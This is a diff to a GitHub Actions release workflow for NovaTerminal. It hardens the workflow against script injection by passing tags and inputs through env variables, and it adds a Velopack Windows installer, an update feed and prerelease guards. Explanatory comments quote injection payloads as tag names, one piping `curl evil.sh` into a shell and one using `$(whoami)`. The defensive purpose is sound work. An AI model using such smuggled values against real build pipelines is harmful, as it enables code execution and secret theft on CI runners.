@@ -39,19 +39,35 @@ jobs:
     runs-on: ubuntu-latest
     outputs:
       release_tag: ${{ steps.meta.outputs.release_tag }}
+      release_version: ${{ steps.meta.outputs.release_version }}
       checkout_ref: ${{ steps.meta.outputs.checkout_ref }}
     steps:
       - name: Resolve tag and checkout ref
         id: meta
         shell: bash
+        # Every ${{ }} value reaches the script through env, never interpolated into it.
+        # workflow_dispatch inputs are supplied by whoever triggers the run, and a tag or
+        # branch name can itself contain shell metacharacters, so interpolating either
+        # directly into a run block is a script-injection hole (a tag named
+        # `v1.0.0"; curl evil.sh | sh; #` would execute). Through env the value is only
+        # ever data. Flagged as githubactions:S7630.
+        env:
+          EVENT_NAME: ${{ github.event_name }}
+          PUSH_REF_NAME: ${{ github.ref_name }}
+          PUSH_REF: ${{ github.ref }}
+          INPUT_TAG_NAME: ${{ inputs.tag_name }}
+          INPUT_TARGET_COMMITISH: ${{ inputs.target_commitish }}
         run: |
-          if [[ "${{ github.event_name }}" == "push" ]]; then
-            echo "release_tag=${{ github.ref_name }}" >> "$GITHUB_OUTPUT"
-            echo "checkout_ref=${{ github.ref }}" >> "$GITHUB_OUTPUT"
+          if [[ "$EVENT_NAME" == "push" ]]; then
+            tag="$PUSH_REF_NAME"
+            echo "checkout_ref=$PUSH_REF" >> "$GITHUB_OUTPUT"
           else
-            echo "release_tag=${{ inputs.tag_name }}" >> "$GITHUB_OUTPUT"
-            echo "checkout_ref=${{ inputs.target_commitish }}" >> "$GITHUB_OUTPUT"
+            tag="$INPUT_TAG_NAME"
+            echo "checkout_ref=$INPUT_TARGET_COMMITISH" >> "$GITHUB_OUTPUT"
           fi
+          echo "release_tag=$tag" >> "$GITHUB_OUTPUT"
+          # Velopack versions are SemVer without a leading 'v'; the tag has one.
+          echo "release_version=${tag#v}" >> "$GITHUB_OUTPUT"
 
   create_release:
     name: Create Release
@@ -59,10 +75,23 @@ jobs:
     needs: [release_metadata]
     steps:
       - name: Create or update release
-        uses: softprops/action-gh-release@v2
+        uses: softprops/action-gh-release@3bb12739c298aeb8a4eeaf626c5b8d85266b0e65 # v2
         with:
           tag_name: ${{ needs.release_metadata.outputs.release_tag }}
           generate_release_notes: true
+          # A SemVer tag's only legal use of '-' is the prerelease separator, so
+          # contains('-') is a sound test for "v0.5.0-beta.1 is not a stable release".
+          #
+          # This flag is load-bearing for the update feed, not cosmetic. Velopack's
+          # GithubSource(repoUrl, token, prerelease: false) filters on GitHub's own
+          # `prerelease` FLAG (GetReleases does `.Where(x => includePrereleases ||
+          # !x.Prerelease)`) - it never inspects the SemVer suffix. And
+          # UpdateManager.CheckForUpdatesAsync does no prerelease filtering of its own
+          # either: it is a bare `feed.Where(Full).MaxBy(x => x.Version)`. So without
+          # this line a beta tag publishes as a NORMAL release, 0.5.0-beta.1 sorts above
+          # 0.4.0, and every installed stable user gets pulled onto the beta. Same story
+          # for `vpk download github`, which filters on the identical flag.
+          prerelease: ${{ contains(needs.release_metadata.outputs.release_tag, '-') }}
 
   build_native:
     name: Build Native (${{ matrix.os }})
@@ -218,25 +247,196 @@ jobs:
         run: dotnet restore
 
       - name: Publish AOT
+        # RELEASE_VERSION through env for the same reason as every other run block in this
+        # file: it derives from a tag or a workflow_dispatch input, so interpolating it into
+        # script source is a command-injection path — on all three runners here, bash and
+        # pwsh alike. $(...) executes in both. env.CONFIGURATION and matrix.rid are literals
+        # from this workflow file, not user input, so they stay inline. (Codex P1 on #340.)
+        #
+        # shell: bash is explicit because this step runs on all three OSes and env-var syntax
+        # is not portable ($VAR in bash, $env:VAR in pwsh, which is the default shell on the
+        # Windows runner). bash is present on every GitHub-hosted runner, and the release_tests
+        # job already runs a bash step on windows-latest, so this is the file's own precedent.
+        shell: bash
         env:
           SKIP_RUST_NATIVE_BUILD: "1"
-        run: dotnet publish src/NovaTerminal.App/NovaTerminal.App.csproj -c ${{ env.CONFIGURATION }} -r ${{ matrix.rid }} --self-contained true -p:PublishAot=true -p:SkipCliShim=true -o artifacts/publish/${{ matrix.rid }}
+          RELEASE_VERSION: ${{ needs.release_metadata.outputs.release_version }}
+        run: dotnet publish src/NovaTerminal.App/NovaTerminal.App.csproj -c ${{ env.CONFIGURATION }} -r ${{ matrix.rid }} --self-contained true -p:PublishAot=true -p:SkipCliShim=true "-p:Version=$RELEASE_VERSION" "-p:InformationalVersion=$RELEASE_VERSION" -o artifacts/publish/${{ matrix.rid }}
 
       - name: Archive bundle
         shell: pwsh
+        # Same reasoning as the metadata job's env block, for PowerShell: in a double-quoted
+        # string `"$(...)"` is a subexpression PowerShell EXECUTES, so a tag named
+        # `v1.0.0$(whoami)` interpolated into script source runs commands on the runner.
+        # Through env it is only ever data. (Codex P1 on #340.)
+        env:
+          RELEASE_TAG: ${{ needs.release_metadata.outputs.release_tag }}
+          RID: ${{ matrix.rid }}
         run: |
-          $rid = "${{ matrix.rid }}"
+          $rid = $env:RID
+          $tag = $env:RELEASE_TAG
           $source = "artifacts/publish/$rid"
-          $dest = "artifacts/release/NovaTerminal-$rid-${{ needs.release_metadata.outputs.release_tag }}.zip"
+          $dest = "artifacts/release/NovaTerminal-$rid-$tag.zip"
           New-Item -ItemType Directory -Force -Path "artifacts/release" | Out-Null
           if (Test-Path $dest) { Remove-Item $dest -Force }
           Compress-Archive -Path "$source/*" -DestinationPath $dest
 
       - name: Upload release asset
-        uses: softprops/action-gh-release@v2
+        uses: softprops/action-gh-release@3bb12739c298aeb8a4eeaf626c5b8d85266b0e65 # v2
         with:
           tag_name: ${{ needs.release_metadata.outputs.release_tag }}
           files: artifacts/release/NovaTerminal-${{ matrix.rid }}-${{ needs.release_metadata.outputs.release_tag }}.zip
+
+      # ---- Windows installer + update feed (#91). win-x64 only; the other two RIDs
+      # ---- keep shipping portable zips exactly as before.
+      - name: Install vpk
+        if: matrix.rid == 'win-x64'
+        run: dotnet tool install -g vpk --version 1.2.0
+
+      - name: Download previous Velopack release (for delta generation)
+        id: velopack_download
+        if: matrix.rid == 'win-x64'
+        continue-on-error: true
+        shell: pwsh
+        env:
+          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+        run: |
+          New-Item -ItemType Directory -Force -Path artifacts/velopack | Out-Null
+          # First release ever, or no prior Velopack assets: nothing to download, and a
+          # full-only release is the correct outcome rather than a failed one.
+          vpk download github --repoUrl https://github.com/benyblack/NovaTerminal --token $env:GH_TOKEN --outputDir artifacts/velopack
+
+      - name: Pack Windows installer (Velopack)
+        if: matrix.rid == 'win-x64'
+        shell: pwsh
+        # RELEASE_TAG/RELEASE_VERSION come through env, never interpolated into the script:
+        # `"$(...)"` in a PowerShell double-quoted string is an executed subexpression, so a
+        # tag named `v1.0.0$(whoami)` would run commands on the runner. (Codex P1 on #340.)
+        env:
+          RELEASE_TAG: ${{ needs.release_metadata.outputs.release_tag }}
+          RELEASE_VERSION: ${{ needs.release_metadata.outputs.release_version }}
+          DOWNLOAD_OUTCOME: ${{ steps.velopack_download.outcome }}
+          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+        run: |
+          $ver = $env:RELEASE_VERSION
+          $tag = $env:RELEASE_TAG
+
+          # Whether a delta is EXPECTED has to be decided from GitHub, not from this
+          # directory. An empty directory means two completely different things: "no prior
+          # Velopack release exists" (legitimate, and the only correct outcome on the first
+          # release) and "the download step failed" (a transient API error). The download step
+          # is continue-on-error because the first case must not fail the release — which means
+          # that without this query, a FAILED download looks exactly like a first release, no
+          # assertion fires, and the release publishes full-only, permanently and silently
+          # dropping delta updates for every client. Ask the releases API which case it is.
+          # (Codex P2 on #340.)
+          # The filter has to mirror what `vpk download github` itself will fetch, or this
+          # query and that step disagree. It skips prereleases (the same GitHub flag
+          # create_release sets from the tag's SemVer suffix) and drafts, so counting a beta's
+          # full package here would demand a delta that vpk was never going to download —
+          # blocking the first STABLE release after any prerelease. (Codex P2 on #340.)
+          $priorFullRaw = gh api "repos/$env:GITHUB_REPOSITORY/releases?per_page=100" `
+            --jq '[.[] | select(.tag_name != env.RELEASE_TAG) | select(.prerelease == false) | select(.draft == false) | .assets[]? | select(.name | endswith("-full.nupkg"))] | length'
+
+          # Check the exit code before trusting the output, and check it IMMEDIATELY - any
+          # other command in between overwrites $LASTEXITCODE. GitHub's pwsh wrapper sets
+          # $ErrorActionPreference = 'stop', but that governs cmdlet errors, not native exit
+          # codes: a failing `gh` (1, 2 or 4 per `gh help exit-codes`) prints nothing to stdout
+          # and does NOT terminate the script. `[int]$null` is 0, so without this the query
+          # failing silently reads as "no prior release", $expectDelta goes false, and the
+          # release publishes full-only - reinstating the exact silent-degradation hole this
+          # query was added to close. (Codex P2 on #340.)
+          if ($LASTEXITCODE -ne 0) {
+            throw "Querying the releases API failed (gh exit code $LASTEXITCODE). Cannot tell a first release from a transient failure, and guessing wrong publishes a release with no delta. Re-run the workflow for this tag."
+          }
+          if ("$priorFullRaw" -notmatch '^\d+$') {
+            throw "The releases API query returned '$priorFullRaw', which is not a count. Refusing to guess whether a delta is expected."
+          }
+          $priorFullCount = [int]$priorFullRaw
+          $expectDelta = $priorFullCount -gt 0
+          Write-Host "Prior full packages on GitHub (excluding $tag): $priorFullCount. Download step outcome: $env:DOWNLOAD_OUTCOME."
+
+          if ($expectDelta -and $env:DOWNLOAD_OUTCOME -ne 'success') {
+            throw "A prior Velopack release exists, but 'vpk download github' did not succeed (outcome: $env:DOWNLOAD_OUTCOME). Packing now would publish a full-only release and silently drop delta updates. Re-run the workflow for this tag once GitHub is reachable."
+          }
+
+          if ($expectDelta) {
+            Write-Host "A delta is expected and will be asserted after packing."
+          } else {
+            Write-Host "No prior Velopack release; full-only output is the correct result."
+          }
+
+          # Make a re-run idempotent. `vpk download github` picks the max-version full out of
+          # the union feed; for an already-published tag that is the tag's OWN
+          # NovaTerminal-$ver-full.nupkg, and `vpk pack` then hard-fails with
+          # "[FTL] There is a release in channel win which is equal or greater to the current
+          # version $ver". Because the portable zips upload in an earlier step, that leaves a
+          # half-published release behind a red job. This workflow supports workflow_dispatch
+          # re-runs by design, so dropping this version's own artifacts first is required, not
+          # defensive.
+          Get-ChildItem artifacts/velopack -Filter "NovaTerminal-$ver-*.nupkg" -ErrorAction SilentlyContinue | Remove-Item -Force
+
+          vpk pack `
+            --packId NovaTerminal `
+            --packVersion $ver `
+            --packDir artifacts/publish/win-x64 `
+            --mainExe NovaTerminal.exe `
+            --packTitle NovaTerminal `
+            --packAuthors benyblack `
+            --icon src/NovaTerminal.App/Assets/nova_icon.ico `
+            --outputDir artifacts/velopack `
+            --noPortable
+          # --noPortable: the release already ships NovaTerminal-win-x64-<tag>.zip, and two
+          # near-identical zips on the releases page is a support question waiting to happen.
+
+          # The installer's file name is ours to choose - nothing resolves it by name - so
+          # give it one that reads clearly next to the zips. Matched by glob because vpk
+          # includes the channel in the name it produces.
+          $setup = Get-ChildItem artifacts/velopack -Filter "*Setup.exe" | Select-Object -First 1
+          if (-not $setup) { throw "vpk pack produced no Setup.exe" }
+          Move-Item $setup.FullName "artifacts/velopack/NovaTerminal-Setup-win-x64-$tag.exe"
+
+          Write-Host "Velopack output:"
+          Get-ChildItem artifacts/velopack | Select-Object Name, Length | Format-Table
+
+          # Assert here rather than at the upload step, which leaves
+          # fail_on_unmatched_files at its permissive default - required, because the first
+          # release legitimately produces no delta, so flipping it would break exactly the
+          # case it is meant to protect. The signal belongs here instead, where "was a delta
+          # expected?" is known from GitHub rather than guessed from an empty directory.
+          if (-not (Test-Path "artifacts/velopack/NovaTerminal-$ver-full.nupkg")) {
+            throw "vpk pack produced no NovaTerminal-$ver-full.nupkg - the update feed would be unusable."
+          }
+          if ($expectDelta -and -not (Test-Path "artifacts/velopack/NovaTerminal-$ver-delta.nupkg")) {
+            throw "A prior Velopack release exists but vpk pack produced no NovaTerminal-$ver-delta.nupkg - delta generation silently failed."
+          }
+
+      # Known and benign: the uploaded releases.win.json lists the PREVIOUS release's full
+      # nupkg too, which is not an asset on THIS release. `vpk pack` re-indexes the whole
+      # output directory, and the previous full is in there because the download step put it
+      # there for delta generation. Deleting it before packing would not help - by the time
+      # the feed exists the entry is already inside it.
+      #
+      # Harmless because nothing on the happy path ever selects that entry:
+      # CheckForUpdatesAsync takes the MAX version, so only a downgrade would reach a
+      # non-latest full, and AllowVersionDowngrade is off. If something did select it,
+      # GitBase.DownloadReleaseEntry resolves assets by name within the release the feed came
+      # from and would throw "Could not find asset called '...' in GitHub Release '<tag>'" -
+      # and that same asset resolves fine through its own release's feed, which is what
+      # clients on the previous version are actually reading.
+      #
+      # The version-scoped globs below are what keep stale nupkgs from being re-UPLOADED onto
+      # this release; do not broaden them to `NovaTerminal-*.nupkg`.
+      - name: Upload Windows installer and update feed
+        if: matrix.rid == 'win-x64'
+        uses: softprops/action-gh-release@3bb12739c298aeb8a4eeaf626c5b8d85266b0e65 # v2
+        with:
+          tag_name: ${{ needs.release_metadata.outputs.release_tag }}
+          files: |
+            artifacts/velopack/NovaTerminal-Setup-win-x64-${{ needs.release_metadata.outputs.release_tag }}.exe
+            artifacts/velopack/NovaTerminal-${{ needs.release_metadata.outputs.release_version }}-full.nupkg
+            artifacts/velopack/NovaTerminal-${{ needs.release_metadata.outputs.release_version }}-delta.nupkg
+            artifacts/velopack/releases.win.json
 
   # Opens a submission PR to microsoft/winget-pkgs for the just-published Windows
   # zip (portable package; see packaging/winget/). Optional and self-skipping:
@@ -250,18 +450,26 @@ jobs:
     name: Submit to winget-pkgs
     runs-on: windows-latest
     needs: [release_metadata, publish_aot]
-    if: github.event_name == 'push'
+    # Never submit a prerelease to the community repo. Same contains('-') test as the
+    # prerelease flag on create_release: winget-pkgs is for stable versions, and a
+    # `-beta`/`-test` tag reaching it is a public retraction, not a private mistake. The step
+    # body also self-skips when WINGET_PAT is unset (it is unset today), but that is a
+    # coincidence of configuration rather than a guard — this is the guard.
+    if: github.event_name == 'push' && !contains(needs.release_metadata.outputs.release_tag, '-')
     steps:
       - name: Submit manifest via wingetcreate
         shell: pwsh
+        # Same injection class as the steps above, and this one predates the installer work:
+        # the tag reaches the script through env rather than being interpolated into it.
         env:
           WINGET_PAT: ${{ secrets.WINGET_PAT }}
+          RELEASE_TAG: ${{ needs.release_metadata.outputs.release_tag }}
         run: |
           if (-not $env:WINGET_PAT) {
             Write-Host "WINGET_PAT not set; skipping winget-pkgs submission."
             exit 0
           }
-          $tag = "${{ needs.release_metadata.outputs.release_tag }}"
+          $tag = $env:RELEASE_TAG
           $ver = $tag.TrimStart('v')
           $url = "https://github.com/benyblack/NovaTerminal/releases/download/$tag/NovaTerminal-win-x64-$tag.zip"
           Invoke-WebRequest https://aka.ms/wingetcreate/latest -OutFile wingetcreate.exe
